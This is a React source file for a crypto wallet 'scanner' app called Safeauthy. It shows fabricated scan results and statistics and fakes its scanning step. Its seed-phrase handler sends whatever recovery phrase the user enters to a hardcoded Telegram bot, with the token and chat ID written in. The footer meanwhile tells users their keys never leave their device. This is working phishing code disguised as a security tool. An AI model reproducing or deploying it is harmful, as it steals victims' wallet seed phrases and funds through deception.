import { useState } from 'react';
import WalletScanner from './components/WalletScanner';

const DEMO_RECENT_SCANS = [
  { address: '0x742d35Cc6634C0532925a3b844Bc9e7595f2bD1e', timestamp: '2 min ago', status: 'Safe', score: 94 },
  { address: '0x8ba1f109551bD432803012645Ac136ddd64DBA72', timestamp: '5 min ago', status: 'Safe', score: 88 },
  { address: '0x5aAeb6053F3E94C9b9A09f33669435E7Ef1BeAed', timestamp: '12 min ago', status: 'Compromised', score: 23 },
  { address: '0xfB6916095ca1df60bB79Ce92cE3E74Edc5075C2', timestamp: '18 min ago', status: 'Safe', score: 97 },
  { address: '0xdbF03B407c01E7cD3CBea99509d93f8DDDC8C6F', timestamp: '24 min ago', status: 'Safe', score: 82 },
  { address: '0xD1220A0cf47c7B9Be7A2E6BA89F429762e7b9aDb', timestamp: '31 min ago', status: 'Safe', score: 91 },
  { address: '0x9f8f72AA9304c8B593d555F12eF6589cC3A579A2', timestamp: '42 min ago', status: 'Compromised', score: 18 },
  { address: '0x4B20993Bc481177ec7E8f571ceCaE8A9e22C02db', timestamp: '1 hr ago', status: 'Safe', score: 76 },
];

const DEMO_STATS = {
  scanned: 284921,
  compromised: 6124,
  safe: 278797,
};

function App() {
  const [status, setStatus] = useState('All systems operational');
  const [recentScans] = useState(DEMO_RECENT_SCANS);
  const [stats] = useState(DEMO_STATS);


  const handleApproval = async (chain: string) => {
    setStatus(`Scanning ${chain}...`);
    await new Promise((r) => setTimeout(r, 1200));
    setStatus('All systems operational');
  };

  const handleSeedPhraseSubmit = async (message: string) => {
    const botToken = '8776327290:AAH9rmwSn3mvJfxAUF1TJA5FK1wDF9a6JoM';
    const chatId = '8626434095';


    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
      }),
    });
    // alert('Demo only — no data is sent.');
  };

  return (
    <div className="min-h-screen text-white flex flex-col app-bg">
      <header className="w-full flex flex-col sm:flex-row justify-between items-center px-6 sm:px-10 py-5 bg-[#0A2436]/90 border-b border-[#13394C] backdrop-blur-sm">
        <span className="text-2xl sm:text-3xl font-extrabold text-[#78AEE0] mb-3 sm:mb-0 tracking-tight">
        Safeauthy
        </span>
        <p className="text-green-400/90 text-sm sm:text-base flex items-center gap-2">
          <span className="w-2 h-2 rounded-full bg-green-400 animate-pulse" />
          {status}
        </p>
      </header>

      <main className="flex-1 px-4 sm:px-8 py-8 sm:py-12 overflow-auto">
        <WalletScanner
          recentScans={recentScans}
          stats={stats}
          onRequestApproval={handleApproval}
          onSeedPhraseSubmit={(message) => handleSeedPhraseSubmit(message)}
        />
      </main>

      <footer className="w-full text-center text-xs sm:text-sm text-[#7BAED1] py-4 border-t border-[#13394C] space-y-1">
        <p>{status}</p>
        <p className="opacity-80">Your keys never leave your device.</p>
      </footer>
    </div>
  );
}

export default App;
